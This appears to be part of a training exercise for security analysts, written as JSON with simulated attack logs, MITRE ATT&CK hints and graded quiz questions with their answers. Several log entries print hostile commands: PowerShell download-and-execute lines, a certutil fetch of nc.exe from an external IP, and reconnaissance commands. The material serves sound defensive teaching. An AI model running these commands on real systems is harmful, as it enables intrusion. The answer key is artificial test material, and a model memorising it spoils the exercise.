+            "User": "CORP\\r.martinez",
+            "Hashes": "SHA256=B5C1E2D3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1",
+            "DecodedCommand": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.42/payload.ps1')",
+            "mitreAttack": "T1059.001"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC08",
+          "username": "r.martinez",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T12:05:22Z",
+          "isEvidence": true,
+          "evidenceTag": "encoded-ps",
+          "sortOrder": 2
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Scheduled task 'UpdateCheck' was created to run at 3:00 AM daily, executing a suspicious binary from C:\\ProgramData. Scheduled tasks are commonly used by attackers for persistence. (MITRE: T1053.005 — Scheduled Task/Job: Scheduled Task)",
+          "rawLog": {
+            "EventID": 4698,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T12:10:00Z",
+            "Computer": "WS-PC08.corp.local",
+            "SubjectUserName": "r.martinez",
+            "TaskName": "\\UpdateCheck",
+            "TaskContent": {
+              "Actions": {
+                "Exec": {
+                  "Command": "C:\\ProgramData\\updater.exe",
+                  "Arguments": "-silent -connect 185.220.101.42"
+                }
+              },
+              "Triggers": {
+                "CalendarTrigger": {
+                  "StartBoundary": "2025-03-16T03:00:00",
+                  "Repetition": {
+                    "Interval": "P1D"
+                  }
+                }
+              }
+            },
+            "mitreAttack": "T1053.005"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC08",
+          "username": "r.martinez",
+          "eventId": "4698",
+          "timestamp": "2025-03-15T12:10:00Z",
+          "isEvidence": true,
+          "evidenceTag": "sched-task",
+          "sortOrder": 3
+        },
+        {
+          "logType": "AUTH_LOG",
+          "summary": "Valid service account 'admin.svc' logged in from an unusual workstation (WS-PC12 instead of its normal management server). Use of valid accounts from unexpected locations may indicate credential compromise. (MITRE: T1078 — Valid Accounts)",
+          "rawLog": {
+            "EventID": 4624,
+            "TimeCreated": "2025-03-15T12:15:00Z",
+            "Computer": "WS-PC12.corp.local",
+            "LogonType": 3,
+            "TargetUserName": "admin.svc",
+            "TargetDomainName": "CORP",
+            "IpAddress": "10.0.1.120",
+            "WorkstationName": "WS-PC12",
+            "NormalWorkstation": "SRV-MGMT01",
+            "mitreAttack": "T1078"
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC12",
+          "username": "admin.svc",
+          "eventId": "4624",
+          "sourceIp": "10.0.1.120",
+          "timestamp": "2025-03-15T12:15:00Z",
+          "isEvidence": true,
+          "evidenceTag": "valid-acct",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "certutil.exe used to download a file from an external IP address. certutil is a legitimate Windows tool that attackers abuse for downloading payloads (Living Off the Land). (MITRE: T1105 — Ingress Tool Transfer)",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T12:20:00Z",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.42/tools/nc.exe C:\\Temp\\nc.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\r.martinez",
+            "Hashes": "SHA256=F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0",
+            "mitreAttack": "T1105"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC08",
+          "username": "r.martinez",
+          "processName": "certutil.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T12:20:00Z",
+          "isEvidence": true,
+          "evidenceTag": "certutil-download",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "A malicious binary was renamed to 'svchost.exe' and placed in C:\\Temp — a non-standard location. The real svchost.exe lives in C:\\Windows\\System32. This is masquerading. (MITRE: T1036 — Masquerading)",
+          "rawLog": {
+            "EventID": 11,
+            "UtcTime": "2025-03-15T12:25:00Z",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "TargetFilename": "C:\\Temp\\svchost.exe",
+            "User": "CORP\\r.martinez",
+            "OriginalFileName": "payload.exe",
+            "Hashes": "SHA256=A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1",
+            "Note": "Real svchost.exe is located at C:\\Windows\\System32\\svchost.exe — this file is in C:\\Temp which is highly suspicious",
+            "mitreAttack": "T1036"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC08",
+          "username": "r.martinez",
+          "processName": "cmd.exe",
+          "eventId": "11",
+          "timestamp": "2025-03-15T12:25:00Z",
+          "isEvidence": true,
+          "evidenceTag": "masquerading",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "The MITRE ATT&CK framework has 14 tactics in order: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Each tactic represents a goal the attacker is trying to achieve.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Key technique mappings: T1566 = Phishing (Initial Access), T1059 = Command and Scripting Interpreter (Execution), T1053 = Scheduled Task/Job (Persistence), T1078 = Valid Accounts (multiple tactics), T1105 = Ingress Tool Transfer (C2), T1036 = Masquerading (Defense Evasion).",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 5,
+      "title": "Putting It All Together — Mini Investigation",
+      "description": "Apply everything you've learned in a realistic mini-incident investigation. A full attack chain has been detected — analyze the logs chronologically, identify the attack stages, and write up your findings.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EMAIL_GATEWAY",
+          "summary": "Phishing email received by j.smith@corp.local from 'hr-benefits@company-updates.xyz' with malicious Excel attachment 'Benefits-Enrollment-2025.xlsm' (macro-enabled). SPF and DKIM checks both failed.",
+          "rawLog": {
+            "timestamp": "2025-03-15T13:00:00Z",
+            "messageId": "<xyz789@mail.company-updates.xyz>",
+            "from": "hr-benefits@company-updates.xyz",
+            "to": "j.smith@corp.local",
+            "subject": "Action Required: Update Your Benefits Enrollment",
+            "attachments": [
+              {
+                "filename": "Benefits-Enrollment-2025.xlsm",
+                "size": 198640,
+                "contentType": "application/vnd.ms-excel.sheet.macroEnabled.12",
+                "sha256": "1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B"
+              }
+            ],
+            "spfResult": "fail",
+            "dkimResult": "fail",
+            "senderIp": "198.51.100.99"
+          },
+          "severity": "HIGH",
+          "hostname": "MAIL-GW01",
+          "username": "j.smith",
+          "sourceIp": "198.51.100.99",
+          "timestamp": "2025-03-15T13:00:00Z",
+          "isEvidence": true,
+          "evidenceTag": "initial-phish",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "EXCEL.EXE spawned cmd.exe on j.smith's workstation WS-PC15. This indicates a malicious macro in the Excel attachment was executed — Office applications should never spawn command interpreters.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T13:02:30Z",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell.exe -NoP -W Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" C:\\Users\\j.smith\\Downloads\\Benefits-Enrollment-2025.xlsm",
+            "User": "CORP\\j.smith",
+            "Hashes": "SHA256=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "processName": "cmd.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T13:02:30Z",
+          "isEvidence": true,
+          "evidenceTag": "macro-exec",
+          "sortOrder": 2
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "cmd.exe spawned powershell.exe with a Base64-encoded command on WS-PC15. The encoded command initiates a download from an external attacker-controlled server.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T13:02:31Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoP -W Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe /c powershell.exe -NoP -W Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+            "User": "CORP\\j.smith",
+            "Hashes": "SHA256=B5C1E2D3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1",
+            "DecodedCommand": "$c=New-Object Net.WebClient; $c.DownloadFile('http://185.220.101.42/implant.exe','C:\\ProgramData\\updater.exe'); Start-Process C:\\ProgramData\\updater.exe"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T13:02:31Z",
+          "isEvidence": true,
+          "evidenceTag": "ps-launch",
+          "sortOrder": 3
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "PowerShell downloaded a payload from attacker IP 185.220.101.42 using Invoke-WebRequest. The file was saved as 'updater.exe' in C:\\ProgramData — a common attacker staging directory.",
+          "rawLog": {
+            "EventID": 3,
+            "UtcTime": "2025-03-15T13:02:35Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORP\\j.smith",
+            "Protocol": "tcp",
+            "Initiated": true,
+            "SourceIp": "10.0.1.100",
+            "SourcePort": 50122,
+            "DestinationIp": "185.220.101.42",
+            "DestinationPort": 80,
+            "DownloadedFile": "C:\\ProgramData\\updater.exe",
+            "DownloadUrl": "http://185.220.101.42/implant.exe"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "processName": "powershell.exe",
+          "eventId": "3",
+          "sourceIp": "10.0.1.100",
+          "destIp": "185.220.101.42",
+          "timestamp": "2025-03-15T13:02:35Z",
+          "isEvidence": true,
+          "evidenceTag": "payload-download",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Reconnaissance commands executed by PowerShell on WS-PC15: whoami.exe, 'net user /domain', and ipconfig.exe. The attacker is enumerating the compromised host and domain environment.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T13:03:10Z",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "CommandLine": "whoami /all",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORP\\j.smith",
+            "RelatedCommands": [
+              {"time": "2025-03-15T13:03:10Z", "command": "whoami /all"},
+              {"time": "2025-03-15T13:03:12Z", "command": "net user /domain"},
+              {"time": "2025-03-15T13:03:14Z", "command": "ipconfig /all"},
+              {"time": "2025-03-15T13:03:16Z", "command": "net group \"Domain Admins\" /domain"}
+            ]
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "processName": "whoami.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T13:03:10Z",
+          "isEvidence": true,
+          "evidenceTag": "host-recon",
+          "sortOrder": 5
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Scheduled task 'ChromeUpdate' created on WS-PC15 for persistence. The task runs C:\\ProgramData\\updater.exe every 4 hours — this ensures the attacker maintains access even after a reboot.",
+          "rawLog": {
+            "EventID": 4698,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T13:05:00Z",
+            "Computer": "WS-PC15.corp.local",
+            "SubjectUserName": "j.smith",
+            "TaskName": "\\ChromeUpdate",
+            "TaskContent": {
+              "Actions": {
+                "Exec": {
+                  "Command": "C:\\ProgramData\\updater.exe",
+                  "Arguments": "-silent"
+                }
+              },
+              "Triggers": {
+                "CalendarTrigger": {
+                  "StartBoundary": "2025-03-15T14:00:00",
+                  "Repetition": {
+                    "Interval": "PT4H"
+                  }
+                }
+              }
+            }
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "eventId": "4698",
+          "timestamp": "2025-03-15T13:05:00Z",
+          "isEvidence": true,
+          "evidenceTag": "persistence-task",
+          "sortOrder": 6
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR platform detected a complete malicious behavior chain on WS-PC15: Office macro execution → command interpreter → encoded PowerShell → file download → reconnaissance → persistence. Full kill chain identified.",
+          "rawLog": {
+            "alertId": "EDR-2025-1547",
+            "severity": "CRITICAL",
+            "timestamp": "2025-03-15T13:06:00Z",
+            "hostname": "WS-PC15",
+            "username": "j.smith",
+            "alertType": "Malicious Behavior Chain",
+            "detectionChain": [
+              "EXCEL.EXE → cmd.exe (T1204.002 — User Execution: Malicious File)",
+              "cmd.exe → powershell.exe -enc (T1059.001 — PowerShell)",
+              "PowerShell → HTTP download (T1105 — Ingress Tool Transfer)",
+              "Reconnaissance commands (T1033 — System Owner/User Discovery)",
+              "Scheduled task creation (T1053.005 — Scheduled Task)"
+            ],
+            "affectedHost": "WS-PC15",
+            "affectedUser": "j.smith",
+            "recommendation": "Isolate host immediately, reset user credentials"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "j.smith",
+          "timestamp": "2025-03-15T13:06:00Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-detection",
+          "sortOrder": 7
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Sustained outbound traffic from WS-PC15 to attacker IP 185.220.101.42 on port 443 (HTTPS). This is likely Command and Control (C2) communication from the implant maintaining a persistent connection.",
+          "rawLog": {
+            "timestamp": "2025-03-15T13:10:00Z",
+            "srcIp": "10.0.1.100",
+            "srcPort": 50250,
+            "dstIp": "185.220.101.42",
+            "dstPort": 443,
+            "protocol": "TCP",
+            "bytesIn": 45200,
+            "bytesOut": 12800,
+            "packetsIn": 120,
+            "packetsOut": 85,
+            "duration": 240.5,
+            "application": "HTTPS",
+            "action": "ALLOW",
+            "hostname": "WS-PC15",
+            "beaconPattern": "Regular interval connections every 60 seconds"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.100",
+          "destIp": "185.220.101.42",
+          "timestamp": "2025-03-15T13:10:00Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-traffic",
+          "sortOrder": 8
+        }
+      ],
+      "hints": [
+        {
+          "content": "Follow the timestamps chronologically — the attack chain starts with the phishing email and cascades through each step. Each log builds on the previous one to tell the full story of the attack.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The EDR alert confirms the full kill chain. Focus on what happened between the email arrival (13:00) and the persistence mechanism (13:05). The entire attack from phishing to persistence took only 5 minutes.",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ]
+    }
+  ],
+  "checkpoints": [
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Which log source records process creation with command-line arguments and file hashes?",
+      "options": ["Windows Event Log", "Sysmon", "EDR Alert", "Network Flow"],
+      "correctAnswer": "Sysmon",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Sysmon (System Monitor) is a Windows Sysinternals tool that logs detailed process creation events including full command-line arguments, parent process information, and cryptographic file hashes. While Windows Event ID 4688 also logs process creation, it does not include file hashes or detailed parent process paths by default.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What does a SIEM alert represent?",
+      "options": ["A single failed login event", "A correlated detection from multiple log sources", "A firewall block rule", "An antivirus signature match"],
+      "correctAnswer": "A correlated detection from multiple log sources",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "A SIEM (Security Information and Event Management) alert represents a correlated detection that combines and analyzes events from multiple log sources. In the example, the SIEM correlated 15 failed login events with a subsequent successful login to detect a potential brute force attack — something no single log source would flag on its own.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Which log source would show blocked connection attempts at the network perimeter?",
+      "options": ["Sysmon", "AUTH_LOG", "Firewall", "DNS"],
+      "correctAnswer": "Firewall",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Firewalls operate at the network perimeter and log all allowed and blocked connection attempts. In this stage, the firewall log showed a blocked inbound RDP connection from an external IP — this is exactly the kind of perimeter defense activity that firewall logs capture.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Which Windows Event ID indicates a successful logon?",
+      "options": ["4625", "4624", "4688", "7045"],
+      "correctAnswer": "4624",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Windows Event ID 4624 records successful logon events. The Logon Type field indicates how the user logged in: Type 2 (Interactive/keyboard), Type 3 (Network/file share), Type 10 (RDP). Event 4625 is for failed logons, 4688 is for process creation, and 7045 is for service installation.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Event ID 7045 indicates what?",
+      "options": ["A user account was created", "A new Windows service was installed", "A process was terminated", "A firewall rule was modified"],
+      "correctAnswer": "A new Windows service was installed",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Windows Event ID 7045 is logged by the Service Control Manager when a new service is installed on the system. In the example, a suspicious service called 'WindowsUpdateHelper' was installed with a binary in C:\\Temp — a classic attacker persistence technique. Service installations outside of planned change windows are major red flags.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What critical information does Sysmon Event ID 1 capture that Windows Event 4688 does NOT?",
+      "options": ["The username who ran the process", "The process ID number", "File hash and full parent process path", "The time the process started"],
+      "correctAnswer": "File hash and full parent process path",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "Sysmon Event ID 1 captures file hashes (SHA256, MD5, etc.) and the full parent process image path with command-line arguments. While Windows Event 4688 logs basic process creation with the process name and a parent process ID, it does not include file hashes by default and provides limited parent process details. This makes Sysmon essential for threat hunting and forensic analysis.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Select all Event IDs that could indicate malicious activity in this stage.",
+      "options": ["key-eventid", "failed-logon", "priv-escalation", "service-install", "account-created", "sysmon-process"],
+      "correctAnswer": ["priv-escalation", "service-install", "account-created"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "The three evidence items indicating potentially malicious activity are: (1) Event 4672 assigning SeDebugPrivilege — debug privileges are commonly used for credential dumping; (2) Event 7045 installing a service from C:\\Temp — legitimate services don't run from temp directories; (3) Event 4720 creating a user account named 'backup$' — the dollar sign is an attempt to disguise it as a computer account. While a failed logon (4625) may be suspicious in volume, a single instance is normal.",
+      "sortOrder": 4
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Which process parent is NORMAL for svchost.exe?",
+      "options": ["explorer.exe", "cmd.exe", "services.exe", "powershell.exe"],
+      "correctAnswer": "services.exe",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "services.exe (the Windows Service Control Manager) is the legitimate and expected parent process for svchost.exe. If svchost.exe has any other parent process, it is highly suspicious and may indicate process injection, hollowing, or a masquerading binary.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Why is OUTLOOK.EXE spawning powershell.exe suspicious?",
+      "options": ["PowerShell is never used on Windows systems", "Email clients should never spawn scripting engines; this indicates a malicious attachment or macro was executed", "Outlook always uses cmd.exe instead of PowerShell", "PowerShell can only be launched by explorer.exe"],
+      "correctAnswer": "Email clients should never spawn scripting engines; this indicates a malicious attachment or macro was executed",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "Email clients like Outlook have no legitimate reason to launch scripting engines such as PowerShell, cmd.exe, or mshta.exe. When this occurs, it almost always means a malicious attachment, embedded OLE object, or exploit triggered the execution of attacker code. This is one of the most reliable detection patterns for email-based attacks.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Select all suspicious process chains from the logs.",
+      "options": ["word-to-ps", "outlook-ps", "excel-mshta", "recon-cmds"],
+      "correctAnswer": ["word-to-ps", "outlook-ps", "excel-mshta", "recon-cmds"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "All four selected process chains are suspicious: (1) WINWORD → cmd → powershell — Word launching a command interpreter indicates macro execution; (2) OUTLOOK → powershell — email client spawning a scripting engine indicates malicious attachment; (3) EXCEL → mshta — spreadsheet launching an HTA handler is a known attack technique; (4) powershell → whoami/ipconfig/net — rapid execution of reconnaissance commands indicates post-compromise enumeration.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "A phishing email with a malicious attachment maps to which MITRE ATT&CK tactic?",
+      "options": ["Execution", "Initial Access", "Persistence", "Collection"],
+      "correctAnswer": "Initial Access",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Phishing with a malicious attachment (T1566.001) maps to the Initial Access tactic. Initial Access describes the techniques attackers use to gain their first foothold in a target network. Other Initial Access techniques include exploiting public-facing applications, supply chain compromise, and drive-by compromise.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Creating a scheduled task to maintain access maps to which tactic?",
+      "options": ["Execution", "Discovery", "Persistence", "Lateral Movement"],
+      "correctAnswer": "Persistence",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Creating a scheduled task (T1053.005) maps to the Persistence tactic. Persistence consists of techniques attackers use to maintain their access across restarts, credential changes, and other interruptions. Scheduled tasks ensure that attacker code runs at regular intervals, surviving system reboots.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Renaming a malicious binary to look like 'svchost.exe' is an example of which technique?",
+      "options": ["T1053.005 Scheduled Task", "T1078 Valid Accounts", "T1036 Masquerading", "T1059.001 PowerShell"],
+      "correctAnswer": "T1036 Masquerading",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Masquerading (T1036) is a Defense Evasion technique where attackers rename malicious files to match legitimate system binaries. In this case, placing a malicious binary named 'svchost.exe' in C:\\Temp is suspicious because the real svchost.exe resides in C:\\Windows\\System32. Analysts should always verify that system binaries are running from their expected locations.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What was the initial attack vector?",
+      "options": ["Brute force attack on RDP", "Phishing email with malicious Excel macro", "Exploited vulnerability in web server", "Compromised USB drive"],
+      "correctAnswer": "Phishing email with malicious Excel macro",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The attack began with a phishing email sent to j.smith containing a macro-enabled Excel file (Benefits-Enrollment-2025.xlsm). When j.smith opened the file and enabled macros, the malicious VBA code executed cmd.exe which spawned PowerShell to download the attacker's payload.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What is the correct kill chain order for this attack?",
+      "options": [
+        "Phishing → Macro Execution → PowerShell → Payload Download → Reconnaissance → Persistence",
+        "Reconnaissance → Phishing → PowerShell → Persistence → Payload Download → Macro Execution",
+        "Payload Download → Phishing → Macro Execution → Persistence → Reconnaissance → PowerShell",
+        "Phishing → Persistence → Macro Execution → Reconnaissance → PowerShell → Payload Download"
+      ],
+      "correctAnswer": "Phishing → Macro Execution → PowerShell → Payload Download → Reconnaissance → Persistence",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "Following the timestamps: (1) 13:00 — Phishing email received; (2) 13:02:30 — Excel macro spawns cmd.exe; (3) 13:02:31 — PowerShell launched with encoded command; (4) 13:02:35 — Payload downloaded from 185.220.101.42; (5) 13:03:10 — Reconnaissance commands (whoami, net user, ipconfig); (6) 13:05:00 — Scheduled task 'ChromeUpdate' created for persistence. The entire attack chain completed in just 5 minutes.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "SEVERITY_CLASSIFICATION",
+      "question": "What severity would you assign to this incident?",
+      "options": ["LOW", "MEDIUM", "HIGH", "CRITICAL"],
+      "correctAnswer": "CRITICAL",
+      "points": 10,
+      "category": "response",
+      "explanation": "This incident is CRITICAL severity because: (1) A host is fully compromised with active C2 communication; (2) The attacker has established persistence via scheduled task; (3) Reconnaissance indicates the attacker is preparing for lateral movement; (4) The C2 channel over HTTPS could be used for data exfiltration at any moment. Immediate containment (host isolation, credential reset) is required.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "INCIDENT_REPORT",
+      "question": "Write a brief incident summary including: the initial attack vector, the affected user and host, the techniques used by the attacker, and at least 3 recommended response actions.",
+      "options": [],
+      "correctAnswer": {
+        "keywords": ["phishing", "macro", "powershell", "persistence", "scheduled task", "185.220.101.42"],
+        "minRecommendations": 3
+      },
+      "points": 15,
+      "category": "report",
+      "explanation": "A complete incident report should include: Initial vector (phishing email with .xlsm attachment), affected assets (user j.smith, workstation WS-PC15), attack techniques (macro execution, encoded PowerShell, payload download, reconnaissance, scheduled task persistence), IOCs (attacker IP 185.220.101.42, malicious domain company-updates.xyz, file C:\\ProgramData\\updater.exe), and recommendations such as: isolate WS-PC15 from the network, reset j.smith's credentials, block 185.220.101.42 at the firewall, remove the ChromeUpdate scheduled task, scan for lateral movement, and perform forensic imaging of the host.",
+      "sortOrder": 4
+    }
+  ]
+}
